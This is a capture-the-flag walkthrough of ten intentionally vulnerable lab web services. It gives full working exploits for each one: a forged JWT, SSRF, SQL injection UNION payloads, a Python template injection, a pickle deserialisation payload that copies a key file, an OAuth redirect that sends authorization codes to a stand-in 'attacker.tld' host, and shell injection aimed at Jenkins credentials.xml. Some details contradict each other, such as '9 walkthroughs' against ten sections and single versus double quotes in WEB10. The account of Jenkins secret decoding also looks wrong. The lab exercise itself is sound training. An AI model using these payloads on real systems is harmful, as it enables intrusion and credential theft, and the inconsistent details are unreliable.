# Web

9 walkthroughs. Every command below was run against the live flag server, and
the flag in each block is the one it actually returned.

All ten web challenges follow the same shape: a small self-contained service,
started with `./run.sh`, listening on the port its `CASE_HEADER.txt` names.
Start with WEB02 — it is the gentlest and the ideas carry over.

Read this once and it applies to every challenge here:

- **The flag is never in the folder.** It comes from the flag server when the
  objective is met. That is why you cannot grep the handout for it, and why a
  solve cannot be faked.
- **The objective value is per-instance.** It is minted when the service
  registers. It is never in the shipped files, so recovering it means actually
  exploiting the flaw.
- **Restarting is safe.** State survives in `state/state.json`, and re-solving
  returns the same flag.

---

## WEB02 — Udgam
### JWT `alg=none` forgery

A deposit gateway issues a JSON Web Token for every request.

The bug is that the verifier asks the token to declare its own algorithm:

```python
alg = (hdr or {"alg": "HS256"}).get("alg", "HS256")
if alg != "none":
    return H._json(403, {"error": "insufficient_scope", ...})
```

A token whose header says `none` gets no signature computed, and none required.
The signature check is not weak — it is skipped. So anyone can mint an admin
session.

**Step 1.** Start it and get a real token.

```console
$ ./run.sh
[WEB02] player service on :8080
[WEB02] registered 4e7d4ef0abf5b807

$ curl -s http://127.0.0.1:8080/api/v1/token/demo
{"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogInJlYWRlciJ9.<sig>"}
```

**Step 2.** Use it, and watch it fail. This step is not filler. It rules out an
authentication bug on your side, and it is the whole lesson of the challenge:
valid is not the same as signed.

```console
$ curl -s 'http://127.0.0.1:8080/api/v1/search?udrn=UDRN-4411902&token=<reader>'
HTTP 403
{"error": "insufficient_scope",
 "detail": "reader tokens may only read the published columns"}
```

**Step 3.** Forge an admin token. Three parts separated by dots; the signature
is empty, so it ends in a trailing dot.

```console
$ python3 -c "import base64,json; e=lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode(); print(e(json.dumps({'alg':'none','typ':'JWT'}).encode()) + '.' + e(json.dumps({'role':'admin','sub':'admin'}).encode()) + '.')"

eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJyb2xlIjogImFkbWluIiwgInN1YiI6ICJhZG1pbiJ9.
#         ^^^^^^^^ the entire exploit is that one word
```

**Step 4.** Read the protected record.

```console
$ curl -s 'http://127.0.0.1:8080/api/v1/search?udrn=UDRN-4411902&token=<forged>'
{
  "name": "Ramesh Iyer", "city": "Nagpur", "amount": 128400,
  "restricted": "UDGAM-SESS-<per-instance>",
  "objective": "complete",
  "flag": "jwtresults0utsidethespec"
}
```

The `restricted` value is the per-instance objective, which is why it had to be
recovered from the running service rather than read from the handout.

> If `alg=none` is ever filtered out, the same class of bug survives as
> algorithm confusion: sign with HS512 using the secret as the HMAC key, RS256
> using the HMAC secret, or HS256 using the public key.

---

## WEB01 — Metadata From Cyberspace
### Server-side request forgery

An advisory aggregator fetches a URL for you and summarises the response. The
document store it trusts sits on the same machine, on loopback.

The filter does not block internal addresses — it helps you:

```python
port = INTERNAL_PORT if is_internal(host) and not port_specified(url) else port
```

If the host is internal and you name no port, the service substitutes its own
internal port. There is nothing to bypass.

```console
$ ./run.sh
[web01] internal service on 127.0.0.1:8091

$ curl -s 'http://127.0.0.1:8091/mirror?source=http%3A%2F%2F127.0.0.1%2Finternal%2Fdocuments%3Fid%3DNCCC-META-0007'
{
  "retrieved": true,
  "document": {"id": "NCCC-META-0007", "note": "NCCC-META-<per-instance>", ...},
  "flag": "ssrfserver4sked4n0therh0st"
}
```

The document id is public and printed on the index page; only the note is
protected. The service checks in-process that the response genuinely came from
the internal store before it issues anything, so this cannot be spoofed by
handing it a JSON body.

---

## WEB03 — Right to Public Services
### Unrestricted file upload leading to code execution

It is tempting to call this path traversal. It is not. The uploaded filename
becomes a database column and never a filesystem path. The bug is that two
pieces of code read that filename differently:

```python
stem, ext = os.path.splitext(doc)
if ext.lower() != ".jpg":     # the check
    return {"error": "only .jpg renders"}
if stem.endswith(".py"):      # the decision
    exec(content, ns)
```

`splitext` looks only at the final suffix. For `proof.py.jpg` it returns
`("proof.py", ".jpg")` — so the extension says photograph and the stem says
template, and both branches pass. This is what is validated versus what is
merely derived.

**Step 1.** Upload a plain `.jpg` containing Python and render it. It must
**not** execute. Do this first, or step 2 proves nothing.

```console
$ curl -s -X POST http://127.0.0.1:8080/upload \
    --data-urlencode 'ref=grievance-0001' \
    --data-urlencode 'doc=broken.jpg' \
    --data-urlencode 'content=import os'
{"stored": 1, "doc": "broken.jpg"}

$ curl -s 'http://127.0.0.1:8080/render?id=1'
{"rendered": true, "template": "broken.jpg", "exec": false}
```

**Step 2.** Same content, filename `proof.py.jpg`.

```console
$ curl -s -X POST http://127.0.0.1:8080/upload \
    --data-urlencode 'ref=grievance-0002' \
    --data-urlencode 'doc=proof.py.jpg' \
    --data-urlencode 'content=import os'
{"stored": 2, "doc": "proof.py.jpg"}

$ curl -s 'http://127.0.0.1:8080/render?id=2'
{"rendered": true, "template": "proof.py.jpg", "exec": true,
 "objective": "complete", "flag": "upl04drightt0servicescl0nes"}
```

There is no command to get right. Any executable payload works, because the
service calls its completion path as soon as `exec` returns.

---

## WEB04 — Vendor Master
### Second-order SQL injection

Both search endpoints use parameterised queries, so they look safe. The bug is
that an ordinary user can write a vendor's `notes`, and a background job then
interpolates that field into a query:

```python
sql = ("SELECT id, name FROM vendors WHERE name LIKE '%" + notes + "%'")
```

That is *second-order*: the payload is a harmless string when you write it, and
becomes SQL when a privileged job runs it later. The job runs as the
back-office identity, which can read the `approvals` table that ordinary users
cannot.

Vendor 2 even ships with `notes = "logistics');--"` — a planted hint for where
the string breaks.

```console
$ curl -s -X POST http://127.0.0.1:8080/vendor \
    --data-urlencode 'id=2' \
    --data-urlencode "notes=%' UNION SELECT tin, tin FROM approvals--"
{"updated": 2}

$ curl -s http://127.0.0.1:8080/refresh
{"objective": "complete", "flag": "vend0rse4rchisf4stbec4usec4ched", ...}
```

Projecting `tin` twice avoids guessing column order entirely. The job's
completion check only asks whether the secret appears anywhere in the returned
rows.

---

## WEB05 — Grid Code
### GraphQL cross-tenant access

Introspection is enabled, so the schema — including fields no page renders —
is public. One of those fields, `legacyAssetLedger`, has a resolver that
forgot the tenant check.

```console
$ curl -s -X POST http://127.0.0.1:8080/graphql \
    -H 'Content-Type: application/json' -d '{"query":"{ myTenant }"}'
{"data": {"myTenant": "GRID-NORTH"}}

$ curl -s -X POST http://127.0.0.1:8080/graphql \
    -H 'Content-Type: application/json' -d '{"query":"{ __schema }"}'
# type Query { operator, myTenant, legacyAssetLedger, __schema }
#                                ^^^^^^^^^^^^^ the one

$ curl -s -X POST http://127.0.0.1:8080/graphql \
    -H 'Content-Type: application/json' -d '{"query":"{ legacyAssetLedger }"}'
{"data": {"legacyAssetLedger": {"tenant": "GRID-SOUTH", ...}},
 "objective": "complete", "flag": "gr4phql0nefieldnever4sked"}
```

Introspection is not a formality here. Asking for `legacyAssetLedger` blind
happens to work, but only because you guessed the name. The real lesson is
that any field the schema advertises is callable whether or not a UI links to
it, so the day one resolver skips an authorisation check it becomes the hole.

---

## WEB06 — Availability Based Tariff
### Server-side template injection

The markup is Jinja-shaped but the engine is Python:

```python
re.sub(r"\{\{\s*(.+?)\s*\}\}",
       lambda m: str(eval(m.group(1), {"__builtins__": __builtins__})), body)
```

So the payload is Python, not Jinja, and `__builtins__` is passed straight
through.

```console
$ curl -s -X POST http://127.0.0.1:8080/report \
    -H 'Content-Type: application/json' -d '{"body":"{{ 2**10 }}"}'
{"report": "1024"}
```

That confirms the language. Jinja would not evaluate it.

The objective is a **side effect**, not a value: reaching the process historian
on `127.0.0.1:8092` sets a flag inside the service, and the next render that
sees it releases your flag.

```python
# payload, as Python -- exec() because the import needs its own namespace
inner = (
    "import urllib.request\n"
    "r = urllib.request.urlopen('http://127.0.0.1:8092/history?id=valve-7', timeout=8)\n"
    "'reached historian: ' + r.read().decode()[:80]\n"
)
body = "{{ exec(%s) }}" % json.dumps(inner)
```

```console
$ curl -s -X POST http://127.0.0.1:8080/report \
    -H 'Content-Type: application/json' -d "$BODY_AS_JSON"
{"historian": {"reached": true}, "objective": "complete",
 "flag": "sstishiftrep0rtfr0m4templ4te"}
```

> **Why the `exec()` wrapper?** Calling `urllib.request.urlopen` directly
> inside the template returns `[render-error]` and looks like a broken
> challenge. The bundles carry a small `User-Agent` shim that replaces
> `urllib.request.Request` with a plain function, and `urlopen`'s own internals
> trip over it. Wrapping the call in `exec()` with its own import sidesteps
> that; raw `socket` also works. This is the reason this one is rated harder.

Note the response shape changes once you succeed: the completion payload
replaces `report`, so check `historian.reached`, not the rendered text.

---

## WEB07 — The Consent Screen
### OAuth open redirect

The allowlist check compares by prefix:

```python
for ok in ALLOWED:
    # Prefix match. RFC 6749 s3.1.2.3 requires exact.
    if target.startswith(ok):
        return True
```

Both RFC 6749 s3.1.2.3 and RFC 8252 s7.3 require exact string comparison. A
prefix match accepts `https://portal.prithvi.coop.attacker.tld`, which is not
the allowed host at all.

```console
$ curl -sD- -o /dev/null \
  'http://127.0.0.1:8080/oauth/authorize?client_id=portal&redirect_uri=https://portal.prithvi.coop.attacker.tld/cb&response_type=code&state=s'
HTTP/1.0 302 Found
Location: https://portal.prithvi.coop.attacker.tld/cb?code=<code>&state=s
```

Exchange the code you captured and the flag is issued:

```console
$ curl -s -X POST http://127.0.0.1:8080/token \
    -d 'grant_type=authorization_code&code=<code>&redirect_uri=https://portal.prithvi.coop.attacker.tld/cb'
{"objective": "complete", "flag": "04uththec0dec4nbech4nged1nce"}
```

Worth doing by hand rather than scripting. You need somewhere for the
authorisation code to land before you can capture it.

---

## WEB08 — The Settlement Screen
### SQL injection

The counterparty search builds its statement by string concatenation:

```python
"SELECT id, name, tin, bank FROM counterparties "
f"WHERE name LIKE '%{term}%' ORDER BY id"
```

The undocumented `settlements` table holds the per-instance values. Close the
`LIKE` and `UNION` the ledger row in. The outer query returns four columns, so
the `UNION` needs four:

```console
$ curl -s --get http://127.0.0.1:8080/search \
    --data-urlencode "q=%' UNION SELECT tin, ref, tin, ref FROM settlements--"
<h2>objective complete</h2>
<pre ...>uni0n3rderbyc0untsc0lumns</pre>
```

Note what you do **not** need: no column guessing, no `ORDER BY` fiddling, no
quoting tricks. Projecting `tin` twice is enough, because the completion check
is "does any returned cell equal the secret".

---

## WEB09 — Yesterday's Appliance
### Default credentials, then unsafe deserialisation

Two flaws, and the order matters.

**Step 1.** The credentials are still the factory ones; you can read them in
`app.py`. Confirm the panel is closed to you first:

```console
$ curl -s http://127.0.0.1:8092/panel
{"error": "authentication_required"}
```

**Step 2.** Log in and keep the session cookie.

```console
$ curl -si -X POST http://127.0.0.1:8092/login \
    -d 'user=admin&password=prithvi-commission' | head -4
HTTP/1.0 302 Found
Set-Cookie: sid=<32 hex>; Path=/
```

**Step 3.** The diagnostics console accepts a "bundle" from a peer unit and
unpickles it, because peer units are trusted:

```python
blob = base64.b64decode(raw, validate=False)
obj = pickle.loads(blob)
```

Unpickling *is* execution, and it happens before any validation. Build a
pickle that writes the appliance key to the file the handler reads afterwards.
`__reduce__` runs during unpickling:

```python
import base64, pickle, os
state = os.path.abspath('./state')
leak, key = os.path.join(state, 'public.txt'), os.path.join(state, 'appliance.key')

class W:
    def __reduce__(self):
        return (exec, (f"open({leak!r},'w').write(open({key!r}).read().strip())",))

print(base64.b64encode(pickle.dumps(W())).decode())
```

**Step 4.** Upload it.

```console
$ curl -s -X POST http://127.0.0.1:8092/panel/diagnostics \
    -H "Cookie: sid=$SID" --data-urlencode "bundle=$BUNDLE"
{"status": "processed", "note": "decoded 1 object(s)",
 "decoded_report": "APPL-SIG-<per-instance>",
 "objective": "complete", "flag": "4ppli4ncedef4ultcredenti4lsneverr0t4ted"}
```

The payload needs no useful return value. The handler compares the file it
finds to the appliance key and completes by itself.

---

## WEB10 — The Build Server
### CI secret exposure via command injection

Two steps, and the second is only reachable because of the first.

**Step 1.** The firmware job is parameterised, and `REV` lands inside single
quotes in a shell string:

```python
cmd = ('echo "building rev ' + rev + '" '
       '&& cp -r ../../src/firmware ./out')
p = subprocess.run(["/bin/sh", "-c", cmd], cwd=WORKSPACE, ...)
```

A "Build Now" click with a crafted `REV` is command execution.

**Step 2.** The signing credential lives outside the workspace, at
`<JENKINS_HOME>/secrets/credentials.xml`. The job's working directory is
`<JENKINS_HOME>/workspace/firmware`, so the relative path to it is
`../../secrets/credentials.xml`. That is the objective: recover the stored
build credential from outside the workspace.

Jenkins' own documentation calls `credentials.xml` obfuscated, not encrypted —
so the `{...}` blob is reversible. Strip the braces, base64-decode, take the
two length bytes at the front, then XOR the remainder against the fixed mask
(`b":::::"`, which is `hudson.util.Secret`'s mask). Submit the result to
`/job/firmware/verify`.

> **Why order matters.** The step-2 path is only meaningful because you can
> read it. The untrusted half of the pair is not the agent here — it is the
> parameter. Everyone believes the agent is the less trusted half, which is
> exactly what the case title is about.

**This one needs a Linux host.** It shells out to `/bin/sh`, which does not
exist on Windows, so the build step returns "build agent unavailable" there.